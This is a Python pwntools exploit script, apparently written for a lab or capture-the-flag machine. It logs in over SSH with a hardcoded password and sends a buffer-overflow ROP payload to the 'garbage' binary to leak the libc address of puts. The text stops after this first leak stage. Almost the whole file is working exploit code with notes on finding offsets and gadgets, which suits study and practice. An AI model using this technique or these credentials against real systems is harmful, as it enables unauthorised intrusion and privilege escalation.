from pwn import *
from time import sleep

session = ssh('margo', '10.10.10.139', password='iamgod$08')

###### CONFIG - What to run and how
context(terminal=['gnome-terminal','-e'])
# p = gdb.debug('./garbage', 'b main')
# p = process('./garbage')
p = session.process('/usr/bin/garbage')
context(os='linux', arch='amd64')

context.log_level = 'DEBUG'

###### VARS
### Searching for puts which will allow me to print itself and its offset compared to the plt - process local table - and got - global object table from the executable (garbage)
### objdump -D garbage | grep puts
# 401050:	ff 25 d2 2f 00 00    	jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
puts_plt = p64(0x401050)
puts_got = p64(0x404028)
main_plt = p64(0x401619)

### I need to find a pop rdi, so with peda: ropsearch "pop rdi". 
### It is needed just because I have to remove an element from the stack.
# 0x0040179b ; pop rdi; ret
pop_rdi = p64(0x0040179b)


### This has been generated with;
### pattern create 500
### given as input and copied a snippet from the overflown register
### pattern offset 'pastehere'
### 135, so +1 vvv
junk = 'A'*136

###### EXPLOIT STAGE 1 - LEAK

### Lets put all together and main_plt to the end is needed to not make it crash after calculating the leaked address.
### We have to restart the program after calculating the leaked address.
payload = junk + pop_rdi + puts_got + puts_plt + main_plt

log.info("Stage 1: Leak address. Payload:\n" + payload)

# Enter access password: 
p.recvuntil('password: ')
p.sendline(payload)
# Access denied.
p.recvuntil('denied.\n')

# Here is leaked the address.
line = p.recvline()
print str(line)
# Let's round it up to be 8 bytes.
leaked_puts = line[:8].strip().ljust(8, "\x00")

log.info("Leaked address: " + leaked_puts)

leaked_puts = u64(leaked_puts)
log.success("Leaked puts@GLIBC: " + str(leaked_puts))
# raw_input()
